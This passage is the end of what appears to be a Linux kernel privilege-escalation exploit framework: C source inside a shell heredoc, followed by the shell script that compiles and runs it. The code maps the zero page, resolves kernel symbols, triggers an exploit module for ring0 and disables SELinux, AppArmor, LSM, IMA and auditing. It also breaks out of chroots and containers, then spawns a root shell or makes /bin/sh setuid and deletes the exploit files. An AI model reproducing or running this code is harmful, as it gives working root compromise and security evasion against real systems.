    execl("/bin/sh", "sh", "-c", "echo '#include <stdio.h>\nint main(int argc, char *argv[])\n{setuid(0);setgid(0);system(argv[1]);return 0;}' > suid.c; gcc suid.c -o suid;chown 0:0 suid; chmod +s suid; rm suid.c;./suid \"rm exp_abacus.so exploit exp_abacus.c exploit.c\";./suid \"ls -la;id\"", NULL);

	fprintf(stdout, " [+] Failed to exec rootshell\n");
}

static inline void __cpuid(unsigned int *eax, unsigned int *ebx, unsigned int *ecx,
				unsigned int *edx)
{
	asm volatile("cpuid"
		: "=a" (*eax),
		  "=b" (*ebx),
		  "=c" (*ecx),
		  "=d" (*edx)
		: "0" (*eax), "2" (*ecx));
}

static inline void cpuid_count(unsigned int op, int count, unsigned int *eax, unsigned int *ebx,
				unsigned int *ecx, unsigned int *edx)
{
	*eax = op;
	*ecx = count;
	__cpuid(eax, ebx, ecx, edx);
}

static bool smep_chicken_out(void)
{
	unsigned int eax, ebx, ecx, edx;
	cpuid_count(7, 0, &eax, &ebx, &ecx, &edx);

	if (ebx & (1 << 7)) {
		char c;
		printf(" [-] SMEP detected, this exploit will very likely fail on recent kernels.  Continue? (y/N)\n");
		c = getchar();
		if (c == 'y' || c == 'Y')
			return false;
		return true;
	}

	return false;
}

int pa__init(void *m)
{
	char cwd[4096];
	char c;

	// save off the current working directory so we can change back to
	// it after breaking out of any chroots
	getcwd(cwd, sizeof(cwd));
	cwd_dirfd = open(cwd, O_RDONLY | O_DIRECTORY);

	/* page some things in */
	mlock(&own_the_kernel, 0x1000);
	c = *(volatile char *)&own_the_kernel;
	mlock(&exp_state, 0x1000);
	mlock(&bella_mafia_quackafella_records_incorporated_by_rhyme_syndicate_three_yellow_men_trillionaire_club, 0x1000);
	c = *(volatile char *)&bella_mafia_quackafella_records_incorporated_by_rhyme_syndicate_three_yellow_men_trillionaire_club;
	mlock(&give_it_to_me_any_way_you_can, 0x1000);
	c = *(volatile char *)&give_it_to_me_any_way_you_can;
	mlock(&exit_kernel, 0x1000);
	c = *(volatile char *)&exit_kernel;
	mlock(&make_range_readwrite, 0x1000);
	c = *(volatile char *)&make_range_readwrite;
	mlock(&make_range_readonly, 0x1000);
	c = *(volatile char *)&make_range_readonly;
	mlock(&get_kallsyms_lookup_name, 0x1000);
	c = *(volatile char *)&get_kallsyms_lookup_name;

	sync();

	get_segment_descriptors();

	exit_stack = (char *)calloc(1, 1024 * 1024);
	if (exit_stack == NULL) {
		fprintf(stdout, "Unable to alloc exit_stack\n");
		exit(1);
	}
	exp_state.exit_stack = exit_stack;

#ifndef NON_NULL_ONLY
	if ((personality(0xffffffff)) != PER_SVR4) {
		mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
		if (mem != NULL) {
			mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
			if (mem != NULL) {
				fprintf(stdout, "UNABLE TO MAP ZERO PAGE!\n");
				goto boo_hiss;
			}
		}
	} else {
		main_ret = mprotect(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
		if (main_ret == -1) {
			fprintf(stdout, "UNABLE TO MPROTECT ZERO PAGE!\n");
			goto boo_hiss;
		}
	}
	goto great_success;
boo_hiss:
#ifdef HAVE_SELINUX
	if (exp_state.run_from_main == 1 && is_selinux_enabled()) {
		security_context_t scontext;
		context_t newcontext;
		int retval;

		retval = getcon(&scontext);
		if (retval < 0)
			goto oh_fail;

		if (strstr(scontext, ":wine_t:")) {
			fprintf(stdout, "allow_unconfined_mmap_low must actually work on this machine!\n");
			/* don't repeat */
			exit(1);
		}

		fprintf(stdout, "But wait!  Perhaps SELinux can revive this dead exploit...\n");
		newcontext = context_new(scontext);
		freecon(scontext);
		retval = context_type_set(newcontext, "wine_t");
		if (retval)
			goto oh_fail;
		scontext = context_str(newcontext);
		if (scontext == NULL)
			goto oh_fail;
		if (security_check_context(scontext) < 0)
			goto oh_fail;
		retval = setexeccon(scontext);
		if (retval < 0)
			goto oh_fail;
		context_free(newcontext);
		fprintf(stdout, "This looks promising!\n");
		execl("/proc/self/exe", NULL);
	}
oh_fail:
	fprintf(stdout, "Nope ;(\n");
#endif
	exit(1);
great_success:
	fprintf(stdout, " [+] MAPPED ZERO PAGE!\n");
#endif

	add_exploit_modules();

	if (num_exploits == 0) {
		fprintf(stdout, "No exploit modules detected, exiting.\n");
		exit(1);
	}

        main_ret=0;

	prepare = modules[main_ret].prep;
	trigger = modules[main_ret].trigger;
	ring0_cleanup = modules[main_ret].ring0_cleanup;
	if (ring0_cleanup) {
		char c;
		mlock(ring0_cleanup, 0x1000);
		c = *(volatile char *)ring0_cleanup;
	}
	get_exploit_state_ptr = modules[main_ret].get_exploit_state_ptr;
	post = modules[main_ret].post;
	requires_null_page = modules[main_ret].requires_null_page;
	requires_symbols_to_trigger = modules[main_ret].requires_symbols_to_trigger;

	exp_state.get_kernel_sym = (_get_kernel_sym)&get_kernel_sym;
	exp_state.own_the_kernel = (void *)&own_the_kernel;
	exp_state.exit_kernel = (void *)&exit_kernel;
	get_exploit_state_ptr(&exp_state);

	our_uid = getuid();

	set_fs_root = (_set_fs_root)get_kernel_sym("set_fs_root");
	set_fs_pwd = (_set_fs_pwd)get_kernel_sym("set_fs_pwd");
	virt_addr_valid = (_virt_addr_valid)get_kernel_sym("__virt_addr_valid");
	vc_sock_stat = (unsigned long)get_kernel_sym("vc_sock_stat");
	prepare_ve0_process = (_prepare_ve0_process)get_kernel_sym("prepare_ve0_process");
	init_task = (unsigned long *)get_kernel_sym("init_task");
	init_fs = (unsigned long)get_kernel_sym("init_fs");
	default_exec_domain = (unsigned long)get_kernel_sym("default_exec_domain");
	bad_file_ops = (unsigned long *)get_kernel_sym("bad_file_ops");
	bad_file_aio_read = (unsigned long)get_kernel_sym("bad_file_aio_read");
	ima_audit = (int *)get_kernel_sym("ima_audit");
	ima_file_mmap = (unsigned char *)get_kernel_sym("ima_file_mmap");
	ima_bprm_check = (unsigned char *)get_kernel_sym("ima_bprm_check");
	ima_path_check = (unsigned char *)get_kernel_sym("ima_path_check");
	ima_file_check = (unsigned char *)get_kernel_sym("ima_file_check");
	selinux_enforcing = (int *)get_kernel_sym("selinux_enforcing");
	selinux_enabled = (int *)get_kernel_sym("selinux_enabled");
	apparmor_enabled = (int *)get_kernel_sym("apparmor_enabled");
	apparmor_complain = (int *)get_kernel_sym("apparmor_complain");
	apparmor_audit = (int *)get_kernel_sym("apparmor_audit");
	apparmor_logsyscall = (int *)get_kernel_sym("apparmor_logsyscall");
	security_ops = (unsigned long *)get_kernel_sym("security_ops");
	default_security_ops = get_kernel_sym("default_security_ops");
	sel_read_enforce = get_kernel_sym("sel_read_enforce");
	audit_enabled = (int *)get_kernel_sym("audit_enabled");
	commit_creds = (_commit_creds)get_kernel_sym("commit_creds");
	prepare_kernel_cred = (_prepare_kernel_cred)get_kernel_sym("prepare_kernel_cred");
	xen_start_info = (unsigned long *)get_kernel_sym("xen_start_info");
	ptmx_fops = (unsigned long *)get_kernel_sym("ptmx_fops");
	mark_rodata_ro = get_kernel_sym("mark_rodata_ro");
	set_kernel_text_ro = get_kernel_sym("set_kernel_text_ro");
	make_lowmem_page_readonly = (_make_lowmem_page_readonly)get_kernel_sym("make_lowmem_page_readonly");
	make_lowmem_page_readwrite = (_make_lowmem_page_readwrite)get_kernel_sym("make_lowmem_page_readwrite");

	if (smep_chicken_out())
		exit(1);

	main_ret = prepare(mem);
	if (main_ret == STRAIGHT_UP_EXECUTION_AT_NULL) {
		mem[0] = '\xff';
		mem[1] = '\x25';
		*(unsigned int *)&mem[2] = (sizeof(unsigned long) != sizeof(unsigned int)) ? 0 : 6;
		*(unsigned long *)&mem[6] = (unsigned long)&own_the_kernel;
	} else if (main_ret == EXIT_KERNEL_TO_NULL) {
		mem[0] = '\xff';
		mem[1] = '\x15';
		*(unsigned int *)&mem[2] = (sizeof(unsigned long) != sizeof(unsigned int)) ? 6 : 12;
		mem[6] = '\xff';
		mem[7] = '\x25';
		*(unsigned int *)&mem[8] = (sizeof(unsigned long) != sizeof(unsigned int)) ? sizeof(unsigned long) : 16;
		*(unsigned long *)&mem[12] = (unsigned long)&own_the_kernel;
		*(unsigned long *)&mem[12 + sizeof(unsigned long)] = (unsigned long)&exit_kernel;
	} else if ((main_ret & EXECUTE_AT_NONZERO_OFFSET) == EXECUTE_AT_NONZERO_OFFSET) {
		int off = main_ret & 0xfff;
		mem[off] = '\xff';
		mem[off + 1] = '\x25';
		*(unsigned int *)&mem[off + 2] = (sizeof(unsigned long) != sizeof(unsigned int)) ? 0 : off + 6;
		*(unsigned long *)&mem[off + 6] = (unsigned long)&own_the_kernel;
	}

	/* trigger it, and handle the exit_kernel case */
	trigger_get_return();

	if (return_to_process_context == 1) {
		int fd = open("/dev/ptmx", O_RDWR);
		struct iovec iov;

		if (fd < 0) {
			fprintf(stdout, " [-] Unable to open /dev/ptmx to change to process context.\n");
			exit(1);
		}
		iov.iov_base = &iov;
		iov.iov_len = sizeof(iov);
		readv(fd, &iov, 1);
	}

	if (exp_state.got_ring0) {
		fprintf(stdout, " [+] Got ring0!\n");
	} else {
		fprintf(stdout, "didn't get ring0, bailing\n");
		exit(0);
	}

	if (return_to_process_context == 2)
		printf(" [+] Adjusted from interrupt handler to process context\n");
	else if (return_to_process_context == 1)
		printf(" [-] Failed ring0 execution after attempting process context re-entry\n");
	if (exp_state.kallsyms_lookup_name)
		printf(" [+] Obtained internal symbol table for extended functionality\n");
	printf(" [+] Detected %s %dk stacks, with current at %p%s\n",
		twofourstyle ? "2.4 style" : "2.6/3.x style",
		eightk_stack ? 8 : 4, (char *)current_addr, 
		(cred_support || (commit_creds && prepare_kernel_cred)) ? " and cred support" : "");
	if (raised_caps)
		fprintf(stdout, " [+] Raised to full old-style capabilities\n");
	if (cred_offset)
		fprintf(stdout, " [+] cred ptrs offset found at 0x%04x in task struct\n", cred_offset);
	if (init_cred_addr)
		fprintf(stdout, " [+] init_cred found at %p\n", (char *)init_cred_addr);

	{
		char msg[64] = {};

		if (what_we_do & DISABLED_APPARMOR)
			strcat(msg, " AppArmor");
		if (what_we_do & DISABLED_SELINUX)
			strcat(msg, " SELinux");
		if (what_we_do & DISABLED_LSM)
			strcat(msg, " LSM");
		if (what_we_do & DISABLED_IMA)
			strcat(msg, " IMA");
		if (!what_we_do)
			strcpy(msg, " nothing, what an insecure machine!");
		fprintf(stdout, " [+] Disabled security of :%s\n", msg);
	}
	if (fs_offset) {
		printf(" [+] Found ->fs offset at 0x%x\n", fs_offset);
		if (init_task && init_fs)
			printf(" [+] Broke out of any chroots or mnt namespaces\n");
	}
	if (vserver_offset) {
		printf(" [+] Found vserver id info at offset 0x%x\n", vserver_offset);
	}
	if (has_vserver) {
		printf(" [+] Broke out of any vserver container\n");
	}
	if (prepare_ve0_process) {
		printf(" [+] Broke out of any OpenVZ container\n");
	}

	if (xen_detected && mark_rodata_ro && set_kernel_text_ro && (make_lowmem_page_readonly == NULL || make_lowmem_page_readwrite == NULL))
		fprintf(stdout, " [+] Unable to issue Xen hypercall for .text modification -- modification disabled\n");

	if (exp_state.got_root == 1)
		fprintf(stdout, " [+] Got root!\n");
	else {
		fprintf(stdout, " [+] Failed to get root :(\n");
		exit(0);
	}

	main_ret = post();
	if (main_ret == RUN_ROOTSHELL)
		exec_rootshell();
	else if (main_ret == CHMOD_SHELL) {
		chmod("/bin/sh", 04755);
		fprintf(stdout, "/bin/sh is now setuid root.\n");
	} else if (main_ret == FUNNY_PIC_AND_ROOTSHELL) {
		system("gthumb --fullscreen ./funny.jpg");
		exec_rootshell();
	}

	return 0;
}

void pa__done(void *m)
{
	return;
}

static inline unsigned long find_starting_string(void)
{
	unsigned long i, x;
	unsigned char *mem;

	for (x = 0; valid_ranges[x][0]; x++) {
		mem = (unsigned char *)valid_ranges[x][0];
	for (i = 0; i < (valid_ranges[x][1] - valid_ranges[x][0]) - 100; i++) {
		if (!memcmp(&mem[i], "\0%s+%#lx/%#lx [%s]", 19) || // 2.6.18 and earlier
		    !memcmp(&mem[i], "\0+%#lx/%#lx [%s]", 17) || // before 3.8
		    !memcmp(&mem[i], "\0+%#lx/%#lx", 12)) // 3.8 and later
			return (unsigned long)mem + i + 1;
	}
	}

	return 0UL;
}

static inline unsigned long find_reference_to_starting_string(unsigned long addr)
{
	unsigned int intaddr = (unsigned int)(addr & 0xFFFFFFFF);
	unsigned long i, x;
	unsigned char *mem;

	for (x = 0; valid_ranges[x][0]; x++) {
		mem = (unsigned char *)valid_ranges[x][0];
	for (i = 0; i < (valid_ranges[x][1] - valid_ranges[x][0]) - 100; i++) {
#ifdef __x86_64__
		if (mem[i] == 0x48 && *(unsigned int *)&mem[i+3] == intaddr)
#else
		if ((mem[i] == 0x68 && *(unsigned int *)&mem[i+1] == intaddr) ||
		    (mem[i] == 0xc7 && mem[i+1] == 0x44 && mem[i+2] == 0x24 && mem[i+3] == 0x04 && *(unsigned int *)&mem[i+4] == intaddr))
#endif
			return (unsigned long)mem + i;
	}
	}

	return 0UL;
}

static inline unsigned long find_call_to_kallsyms_lookup(unsigned char *mem, unsigned long len, unsigned long addr)
{
	unsigned long idx = addr - (unsigned long)mem;
	unsigned long i;

	for (i = idx; i > idx - 0x100; i--) {
		if (mem[i] == 0xe8 && *(int *)&mem[i+1] > -0x1000 && *(int *)&mem[i+1] < 0)
			return (unsigned long)mem + i;
	}

	return 0UL;
}

static inline unsigned long get_call_target(unsigned long addr)
{
	return addr + 5 + *(int *)(addr + 1);

}

static inline unsigned long find_kallsyms_expand_symbol(unsigned char *mem, unsigned long len, unsigned long addr)
{
	unsigned long i;
	unsigned long startidx = addr - (unsigned long)mem;
	int count = 0;

	for (i = startidx + 0x20; i < startidx + 0x100; i++) {
		// find near call followed by a test r12/r13
#ifdef __x86_64__
		if (mem[i] == 0xe8 && mem[i+3] > 0xF0 && mem[i+4] == 0xFF && mem[i+5] == 0x4d)
#else
		if ((mem[i] == 0xe8 && mem[i+3] > 0xF0 && mem[i+4] == 0xFF && mem[i+5] == 0x85) ||
			// interleaved mov
		    (mem[i] == 0xe8 && mem[i+3] > 0xF0 && mem[i+4] == 0xFF && mem[i+5] == 0x8b && mem[i+8] == 0x85))
#endif
			return get_call_target((unsigned long)mem + i);
	}

	return 0UL;
}

static inline bool call_to_function_pointer_nearby(unsigned char *mem, unsigned long len, unsigned long addr)
{
	unsigned long startidx = addr - (unsigned long)mem;
	unsigned long i;

	for (i = startidx; i < startidx + 0x30; i++) {
		// look for call reg / test eax, eax
#ifdef __x86_64__
		if (mem[i] == 0x41 && mem[i+1] == 0xff && mem[i+3] == 0x85 && mem[i+4] == 0xc0)
#else
		if ((mem[i] == 0xff && mem[i+2] == 0x85 && mem[i+3] == 0xc0) ||
		    (mem[i] == 0xff && mem[i+3] == 0xff && mem[i+4] == 0xff && mem[i+5] == 0xff && mem[i+6] == 0x85 && mem[i+7] == 0xc0))
#endif
			return true;
	}

	return false;
}

static inline bool has_return_value_checking_call_nearby(unsigned char *mem, unsigned long len, unsigned long addr)
{
	unsigned long startidx = addr - (unsigned long)mem;
	unsigned long i;

	for (i = startidx; i < startidx + 0x30; i++) {
		// look for relative call / test eax, eax
		if (mem[i] == 0xe8 && (mem[i+4] == 0x00 || mem[i+4] == 0xff) && mem[i+5] == 0x85 && mem[i+6] == 0xc0) {
			// now look for the jnz / mov / jmp sequence
#ifdef __x86_64__
			if (mem[i+7] == 0x75 && mem[i+9] == 0x48 && mem[i+17] == 0xeb)
#else
			if (mem[i+7] == 0x75 && mem[i+9] == 0x8b && mem[i+16] == 0xeb)
#endif
				return true;
		}
	}

	return false;
}

static inline unsigned long get_function_address(unsigned char *mem, unsigned long len, unsigned long addr)
{
	unsigned long startidx = addr - (unsigned long)mem;
	unsigned long i;

	for (i = startidx; i > startidx - 0x100; i--) {
#ifdef __x86_64__
		if (!memcmp(&mem[i], "\x55\x48\x89\xe5", 4))
#else
		if (!memcmp(&mem[i], "\x55\x89\xe5", 3) || !memcmp(&mem[i], "\x55\x89\xc5", 3))
#endif
			return (unsigned long)mem + i;
	}

	return 0UL;
}

static inline unsigned long find_kallsyms_lookup_name(unsigned char *mem, unsigned long len, unsigned long addr)
{
	unsigned long startidx = addr - (unsigned long)mem - 0x2000;
	unsigned long endidx = addr - (unsigned long)mem + 0x2000;
	unsigned long i;

	for (i = startidx; i < endidx; i++) {
		if (mem[i] == 0xe8 && get_call_target((unsigned long)mem + i) == addr) {
			// found a call to kallsyms_expand_symbol
			if (call_to_function_pointer_nearby(mem, len, (unsigned long)mem + i + 5))
				continue;
			if (!has_return_value_checking_call_nearby(mem, len, (unsigned long)mem + i + 5))
				continue;
			return get_function_address(mem, len, (unsigned long)mem + i);
		}
	}

	return 0UL;
}

static unsigned long get_kallsyms_lookup_name(void)
{
	unsigned char *base;
	unsigned long len;
	unsigned long start_string;
	unsigned long start_string_ref;
	unsigned long kallsyms_lookup_call;
	unsigned long kallsyms_lookup;
	unsigned long kallsyms_expand_symbol;
	unsigned long kallsyms_lookup_name_func;
	int i;

#ifdef __x86_64__
	find_kernel_ranges();
#else
	/* hack for now */
	valid_ranges[0][0] = KERNEL_BASE + 0x01000000;
	valid_ranges[0][1] = valid_ranges[0][0] + (1024 * 1024 * 16);
#endif

	if (!valid_ranges[0][0] || !valid_ranges[0][1])
		return 0UL;
	start_string = find_starting_string();
	if (!start_string)
		return 0UL;
	start_string_ref = find_reference_to_starting_string(start_string);
	if (!start_string_ref)
		return 0UL;
	for (i = 0; i < NUM_RANGES; i++) {
		if (start_string_ref >= valid_ranges[i][0] && start_string_ref < valid_ranges[i][1]) {
			base = (unsigned char *)valid_ranges[i][0];
			len = valid_ranges[i][1] - valid_ranges[i][0];
			break;
		}
	}
	kallsyms_lookup_call = find_call_to_kallsyms_lookup(base, len, start_string_ref);
	if (!kallsyms_lookup_call)
		return 0UL;
	kallsyms_lookup = get_call_target(kallsyms_lookup_call);
	kallsyms_expand_symbol = find_kallsyms_expand_symbol(base, len, kallsyms_lookup);
	if (!kallsyms_expand_symbol)
		return 0UL;
	kallsyms_lookup_name_func = find_kallsyms_lookup_name(base, len, kallsyms_expand_symbol);

	return kallsyms_lookup_name_func;
}

int main(void)
{
  exp_state.run_from_main = 1;
  pa__init(NULL);
  return 0;
}
_EOF

GCC=gcc
IS_64=`uname -m`
LINK_FLAG="-ldl"
OPT_FLAG="-fomit-frame-pointer -O2"
if [ "$IS_64" = "x86_64" ]; then
  OPT_FLAG="-m64 -fomit-frame-pointer -O2"
fi
OPT_FLAG="$OPT_FLAG -DNON_NULL_ONLY"

for FILE in exp_*.c; do
    printf "Compiling $FILE..."
    $GCC -fno-stack-protector -fPIC $OPT_FLAG -shared -o `printf $FILE | cut -d"." -f1`.so $FILE $LINK_FLAG 2> /dev/null
    if [ "$?" = "1" ]; then
       $GCC -fPIC $OPT_FLAG -shared -o `printf $FILE | cut -d"." -f1`.so $FILE $LINK_FLAG 2> /dev/null
       if [ "$?" = "1" ]; then
	 printf "failed.\n"
       else
         printf "OK.\n"
       fi
    else
      printf "OK.\n"
    fi
done

ESCAPED_PWD=`pwd | sed 's/\//\\\\\//g'`
MINADDR=`cat /proc/sys/vm/mmap_min_addr 2> /dev/null`
if [ "$1" != "" -o "$MINADDR" = "" -o "$MINADDR" = "0" ]; then
    sed "s/\/home\/spender/$ESCAPED_PWD/g" exploit.c > exploit1.c
    mv exploit.c exploit2.c
    mv exploit1.c exploit.c
    $GCC -fno-stack-protector -fno-pie $OPT_FLAG -o exploit exploit.c $LINK_FLAG 2> /dev/null
    if [ "$?" = "1" ]; then
        $GCC -fno-stack-protector $OPT_FLAG -o exploit exploit.c $LINK_FLAG 2> /dev/null
    fi
    if [ "$?" = "1" ]; then
        $GCC $OPT_FLAG -o exploit exploit.c $LINK_FLAG 2> /dev/null
    fi
    mv -f exploit2.c exploit.c
    ./exploit
else
    sed "s/\/home\/spender/$ESCAPED_PWD/g" exploit.c > exploit1.c
    mv exploit.c exploit2.c
    mv exploit1.c exploit.c
    $GCC -fno-stack-protector -fno-pie $OPT_FLAG -o exploit exploit.c $LINK_FLAG 2> /dev/null
    if [ "$?" = "1" ]; then
       $GCC -fno-stack-protector $OPT_FLAG -o exploit exploit.c $LINK_FLAG 2> /dev/null
    fi
    if [ "$?" = "1" ]; then
       $GCC $OPT_FLAG -o exploit exploit.c $LINK_FLAG 2> /dev/null
    fi
    mv -f exploit2.c exploit.c
    ./exploit
fi
